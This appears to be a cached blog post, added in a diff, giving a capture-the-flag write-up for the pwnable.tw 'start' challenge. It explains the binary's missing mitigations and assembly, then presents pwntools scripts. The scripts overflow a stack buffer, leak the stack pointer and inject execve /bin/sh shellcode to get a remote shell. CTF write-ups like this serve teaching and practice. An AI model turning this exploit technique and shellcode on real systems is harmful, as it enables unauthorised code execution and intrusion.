@@ -1,0 +1,98 @@
+I"$<p><img src="/assets/images/pwnabletw1/pwnable1.png" alt="" /></p>
+
+<h4 id="aim">AIM:</h4>
+<p>Hey guys, Here our main objective is to get a shell and then to get the flag !!
+I have tried my best to explain the challenge. Hope you like it !!</p>
+
+<h3 id="solution">Solution:</h3>
+
+<p>First I check the mitigations :</p>
+
+<p><img src="/assets/images/pwnabletw1/pwnable2.png" alt="" /></p>
+
+<p>So I think it’s going to be fun !! As we have the permission to execute the stack (NX disabled). There is also no PIE so we don’t have to worry about the address changing every time :)
+Now, let us run the binary and see what is happening :&gt;</p>
+
+<p><img src="/assets/images/pwnabletw1/pwnable3.png" alt="" /></p>
+
+<p>So it’s simple just asking input and printing something. Now its time to see the assembly behind this binary.</p>
+
+<p><img src="/assets/images/pwnabletw1/pwnable4.png" alt="" /></p>
+
+<p>So we can observe that all the registers are being emptied and then 5 values are beings pushed to the stack.
+If we examine them we can see that they are the strings that are printed when we run the binary.
+Math → 5 pushes are made and 4 bytes are taken for each push so a total of 20 bytes is taken by the binary to store it :P.
+Also <code class="language-plaintext highlighter-rouge">INT 0x80</code> is equivalent to syscall. We can observe 2 syscalls being called</p>
+
+<p><img src="/assets/images/pwnabletw1/pwnable5.png" alt="" /></p>
+
+<p>The first syscall is used to make the write. (For printing the string)</p>
+
+<p><img src="/assets/images/pwnabletw1/pwnable6.png" alt="" /></p>
+
+<p>The second syscall is used to call read ( Probably to take our input ). Now let’s see what we can do to get root access !!</p>
+
+<p>I hope you find the offset by yourself or try pattern create in gdb-peda. :)</p>
+
+<h4 id="idea">Idea:</h4>
+
+<ul>
+  <li>We have to overflow to the return address and then we have to somehow leak the stack pointer (ESP)</li>
+  <li>So if we get the stack pointers address then we can place the shellcode there and then point the EIP to that address to give us a shell!</li>
+</ul>
+
+<p><code class="language-plaintext highlighter-rouge">Remember the write syscall prints the buffer pointed by the ECX.</code></p>
+
+<ul>
+  <li>After the syscall, the stack is cleared as they call the add instruction (It removes the 20 bytes)</li>
+</ul>
+
+<h4 id="crafting-the-exploit">Crafting the Exploit:</h4>
+
+<ul>
+  <li>first 20 bytes to fill the buffer then put the address of move ESP to ECX.</li>
+  <li>So first input will give the ESP.</li>
+  <li>Next, we place the shellcode (from shellstorm.org) then execute it.</li>
+  <li>We don’t have to worry about the shift of the stack because there is no PIE</li>
+</ul>
+
+<div class="language-py highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
+<span class="n">p</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="s">'chall.pwnable.tw'</span><span class="p">,</span> <span class="mi">10000</span><span class="p">)</span>
+<span class="k">print</span><span class="p">(</span><span class="n">p</span><span class="p">.</span><span class="n">read</span><span class="p">())</span>
+<span class="n">buf</span> <span class="o">=</span> <span class="s">'A'</span><span class="o">*</span><span class="mi">20</span>
+<span class="n">buf</span> <span class="o">+=</span> <span class="n">p32</span><span class="p">(</span><span class="mh">0x08048087</span><span class="p">)</span>
+<span class="n">p</span><span class="p">.</span><span class="n">send</span><span class="p">(</span><span class="n">buf</span><span class="p">)</span>
+<span class="n">esp</span> <span class="o">=</span> <span class="n">unpack</span><span class="p">(</span><span class="n">p</span><span class="p">.</span><span class="n">read</span><span class="p">()[:</span><span class="mi">4</span><span class="p">])</span>
+<span class="k">print</span> <span class="nb">hex</span><span class="p">(</span><span class="n">esp</span><span class="p">)</span>
+<span class="n">p</span><span class="p">.</span><span class="n">interactive</span><span class="p">()</span>
+
+</code></pre></div></div>
+
+<p>note: u32 is the opposite of p32 this returns the number and then we convert the number to hex. Also, we read the first 4 bytes the server sends us.</p>
+
+<p>Output: <code class="language-plaintext highlighter-rouge">0xff819750</code></p>
+
+<h4 id="final-exploitation">Final Exploitation</h4>
+
+<ul>
+  <li>We place the shellcode then just execute it, in the read that followed the write.</li>
+</ul>
+
+<div class="language-py highlighter-rouge"><div class="highlight"><pre class="highlight"><code>
+<span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
+<span class="n">p</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="s">'chall.pwnable.tw'</span><span class="p">,</span> <span class="mi">10000</span><span class="p">)</span>
+<span class="k">print</span><span class="p">(</span><span class="n">p</span><span class="p">.</span><span class="n">read</span><span class="p">())</span>
+<span class="n">buf</span> <span class="o">=</span> <span class="s">'A'</span><span class="o">*</span><span class="mi">20</span>
+<span class="n">buf</span> <span class="o">+=</span> <span class="n">p32</span><span class="p">(</span><span class="mh">0x08048087</span><span class="p">)</span>
+<span class="n">p</span><span class="p">.</span><span class="n">send</span><span class="p">(</span><span class="n">buf</span><span class="p">)</span>
+<span class="n">esp</span> <span class="o">=</span> <span class="n">unpack</span><span class="p">(</span><span class="n">p</span><span class="p">.</span><span class="n">read</span><span class="p">()[:</span><span class="mi">4</span><span class="p">])</span>
+<span class="n">shellcode</span> <span class="o">=</span> <span class="s">b'</span><span class="se">\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80</span><span class="s">'</span>
+<span class="c1">#new exploit
+</span><span class="n">buf</span> <span class="o">=</span> <span class="s">'a'</span><span class="o">*</span><span class="mi">20</span>
+<span class="n">buf</span> <span class="o">+=</span> <span class="n">p32</span><span class="p">(</span><span class="n">esp</span><span class="o">+</span><span class="mi">20</span><span class="p">)</span>
+<span class="n">buf</span> <span class="o">+=</span> <span class="n">shellcode</span>
+<span class="n">p</span><span class="p">.</span><span class="n">send</span><span class="p">(</span><span class="n">buf</span><span class="p">)</span>
+<span class="n">p</span><span class="p">.</span><span class="n">interactive</span><span class="p">()</span>
+
+</code></pre></div></div>
+:ET
